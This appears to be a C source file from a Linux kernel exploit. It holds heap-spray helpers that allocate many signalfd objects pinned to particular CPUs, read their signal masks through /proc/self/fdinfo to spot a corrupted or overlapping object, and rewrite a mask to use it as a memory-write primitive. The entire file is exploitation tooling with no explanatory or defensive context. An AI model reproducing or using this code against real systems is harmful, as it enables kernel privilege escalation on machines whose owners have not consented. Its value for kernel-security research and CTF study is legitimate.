#include <sys/signalfd.h>
#include <stdio.h>
#include <stdlib.h>
#include <err.h>
#include <errno.h>
#include <unistd.h>

#include "cpu_utils.h"
#include "signalfd_spray.h"

void spray_signalfd(uint64_t* mask, int num, int cpu, int* fds) {
  if (migrate_to_cpu(cpu) == -1) {
    return;
  }
  for (int i = 0; i < num; i++) {
    int ret = signalfd(-1, (sigset_t*)mask, 0);
    fds[i] = ret;
  }
}

uint64_t read_signalfd_mask(int fd) {
  char buffer[100] = {0};
  int size = snprintf(buffer, 100, "/proc/self/fdinfo/%d", fd);
  if (size < 0 || size >= 100) err(1, "read_signalfd_mask buffer too small\n");
  FILE* proc_fd = fopen(buffer, "r");
  if (proc_fd == NULL) {
    err(1, "fail to open fdinfo\n");
  }
  uint64_t x = 0x13371337;
  while(fscanf(proc_fd, "%*s\t%lx\n", &x) == 1);
  fclose(proc_fd);
  return x;
}

void spray_with_intervals(uint64_t interval, int count, int exclude_cpu_mask, uint64_t* mask, int* fds, int spray_size) {
  uint64_t offset = 0;
  for (int i = 0; i < count; i++) {
    for (int cpu = 0; cpu < CPU_RANGE; cpu++) {
      if ((1 << cpu) & exclude_cpu_mask) {
        offset += spray_size;
        continue;
      }
      spray_signalfd(mask, spray_size, cpu, fds + offset);
      offset += spray_size;
    }
    usleep(interval);
  }
}

int search_changed_mask(uint64_t expected, int* fds, uint64_t fd_size, uint64_t* new_mask) {
  for (int i = 0; i < fd_size; i++) {
    if (fds[i] == -1 || fds[i] == 0) continue;
    uint64_t this_mask = read_signalfd_mask(fds[i]);
    if (this_mask != expected) {
      printf("mask %lx %d\n", this_mask, i);
      *new_mask = this_mask;
      return i;
    }
  }
  return -1;
}

void change_signalfd_mask(uint64_t* mask, int fd) {
  if (fd == -1) err(1, "fd should not be -1\n");
  if (signalfd(fd, (sigset_t*)mask, 0) < 0) {
    err(1, "Failed to change mask\n");
  }

}
